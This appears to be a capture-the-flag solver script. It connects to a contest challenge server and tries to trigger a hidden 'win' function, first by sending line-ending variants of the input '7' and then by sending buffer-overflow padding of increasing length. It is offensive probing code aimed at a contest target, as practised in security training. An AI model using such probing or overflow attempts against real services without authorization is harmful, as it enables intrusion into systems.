#!/usr/bin/env python3
import socket
import time

def try_win_exploit():
    """Try to exploit the win function"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("chals.uscc-cyberbowl-2025.ctf.institute", 3015))
    
    # Get initial data
    data = sock.recv(1024)
    print(f"Initial: {data}")
    
    # Get prompt
    data = sock.recv(1024)
    print(f"Prompt: {data}")
    
    # Try to send 7 with various techniques
    techniques = [
        b"7\n",
        b"7 \n",
        b" 7\n",
        b"7\t\n",
        b"7\r\n",
        b"7\n\n",
        b"7\n\r",
        b"7\r\n\r",
        b"7\n\r\n",
        b"7\r\n\n",
    ]
    
    for i, technique in enumerate(techniques):
        print(f"\nTrying technique {i+1}: {technique}")
        sock.send(technique)
        
        # Get response
        data = sock.recv(1024)
        print(f"Response: {data}")
        
        if b"RAIDER KING" in data or b"Override scrapyard locks" in data:
            print("SUCCESS! Got RAIDER KING access!")
            # Get more data
            more_data = sock.recv(1024)
            print(f"Additional data: {more_data}")
            break
            
        if b"flag" in data.lower() or b"ctf" in data.lower():
            print("Found flag or CTF content!")
            print(f"Full response: {data}")
            break
    
    sock.close()

def try_buffer_overflow_win():
    """Try buffer overflow to trigger win function"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("chals.uscc-cyberbowl-2025.ctf.institute", 3015))
    
    # Get initial data
    data = sock.recv(1024)
    print(f"Initial: {data}")
    
    # Get prompt
    data = sock.recv(1024)
    print(f"Prompt: {data}")
    
    # Try buffer overflow with different sizes
    sizes = [10, 20, 50, 100, 200, 500, 1000]
    
    for size in sizes:
        print(f"\nTrying buffer overflow with size {size}...")
        sock.send(b"A" * size + b"7\n")
        
        # Get response
        data = sock.recv(1024)
        print(f"Response: {data}")
        
        if b"RAIDER KING" in data or b"Override scrapyard locks" in data:
            print("SUCCESS! Got RAIDER KING access!")
            # Get more data
            more_data = sock.recv(1024)
            print(f"Additional data: {more_data}")
            break
            
        if b"flag" in data.lower() or b"ctf" in data.lower():
            print("Found flag or CTF content!")
            print(f"Full response: {data}")
            break
    
    sock.close()

def main():
    print("=== Trying to exploit win function ===")
    try_win_exploit()
    
    print("\n=== Trying buffer overflow to trigger win ===")
    try_buffer_overflow_win()

if __name__ == "__main__":
    main()